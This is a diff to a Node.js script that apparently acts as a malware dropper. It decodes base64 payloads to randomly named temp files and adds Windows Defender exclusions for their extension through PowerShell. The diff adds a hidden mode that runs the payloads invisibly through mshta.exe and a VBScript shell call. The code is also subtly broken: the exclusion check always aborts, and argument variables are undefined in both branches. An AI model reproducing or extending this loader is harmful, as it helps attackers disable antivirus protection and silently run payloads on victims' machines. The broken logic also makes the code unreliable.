@@ -9,19 +9,25 @@ var processes = [{process_ext:"key1", process_code:"BASE64DATA", new_console: fa
 
 function main() {
     for (var i = 0; i < processes.length; i++) {
-        handle_process(processes[i].process_ext, processes[i].process_code);
+        handle_process(processes[i].process_ext, processes[i].process_code, processes[i].new_console, processes[i].hidden);
     }
 }
 
 function defender_exclusions() {
     var run_command = "cmd.exe";
     var run_args = ["/d", "/c", "call", "powershell.exe", "Add-MpPreference -ExclusionExtension " + process_ext];
-    var process = spawn(run_command, run_args, { stdio: 'inherit' });
+    var child = spawn(run_command, run_args, { stdio: 'inherit' });
+
+    child.on('exit', function(code) {
+        return code;
+    });
 }
 
-function handle_process(process_ext, process_code) {
+function handle_process(process_ext, process_code, new_console, hidden) {
     if (exclusions) {
-        defender_exclusions();
+        if (defender_exclusions() != 0) {
+            return;
+        }
     }
 
     var random_name = Math.random().toString(36).substring(7);
@@ -30,9 +36,21 @@ function handle_process(process_ext, process_code) {
 
     fs.writeFileSync(tempFile, Buffer.from(process_code, 'base64'));
 
-    var run_command = "cmd.exe";
-    var run_args = ["/d", "/c", "call", tempFile];
-    var process = spawn(run_command, run_args, { stdio: 'inherit' });
+    if (hidden) {
+        var run_command = "mshta.exe";
+        var args = 'vbscript:close(createobject("wscript.shell").run("cmd.exe /c ' + tempFile + '",0))';
+    } else {
+        var run_command = "cmd.exe";
+        var run_args = ["/d", "/c", "call", tempFile];
+    }
+
+
+    if (new_console) {
+        run_args.unshift("/c", "start");
+        spawn(run_command, [args]);
+    } else {
+        spawn(run_command, [args], { stdio: 'inherit' });
+    }
 }
 
 main();
